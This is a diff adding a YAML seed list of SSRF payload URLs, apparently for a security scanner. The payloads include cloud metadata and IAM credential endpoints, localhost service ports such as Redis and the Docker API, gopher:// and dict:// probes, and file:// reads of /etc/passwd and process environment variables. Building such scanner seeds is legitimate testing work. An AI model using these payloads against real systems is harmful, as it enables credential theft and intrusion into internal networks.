@@ -1,0 +1,44 @@
+# SSRF payload 扩充：更多内网段/协议/云元数据
+seeds:
+  ssrf:
+    urls:
+      - raw: "http://169.254.169.254/latest/meta-data/"
+        ctx: ["all"]
+      - raw: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        ctx: ["all"]
+      - raw: "http://169.254.169.254/latest/user-data/"
+        ctx: ["all"]
+      - raw: "http://metadata.google.internal/computeMetadata/v1/"
+        ctx: ["all"]
+      - raw: "http://metadata.tencentyun.com/latest/meta-data/"
+        ctx: ["all"]
+      - raw: "http://100.100.100.200/latest/meta-data/"
+        ctx: ["all"]
+      - raw: "http://169.254.170.2/v2/credentials/"
+        ctx: ["all"]
+      - raw: "http://127.0.0.1:80/"
+        ctx: ["all"]
+      - raw: "http://127.0.0.1:8080/"
+        ctx: ["all"]
+      - raw: "http://127.0.0.1:3306/"
+        ctx: ["all"]
+      - raw: "http://127.0.0.1:6379/"
+        ctx: ["all"]
+      - raw: "http://10.0.0.1/"
+        ctx: ["all"]
+      - raw: "http://172.16.0.1/"
+        ctx: ["all"]
+      - raw: "http://192.168.1.1/"
+        ctx: ["all"]
+      - raw: "dict://127.0.0.1:6379/info"
+        ctx: ["all"]
+      - raw: "gopher://127.0.0.1:6379/_info"
+        ctx: ["all"]
+      - raw: "file:///etc/passwd"
+        ctx: ["all"]
+      - raw: "file:///proc/self/environ"
+        ctx: ["all"]
+      - raw: "http://127.0.0.1:2375/version"
+        ctx: ["all"]
+      - raw: "http://127.0.0.1:9200/"
+        ctx: ["all"]
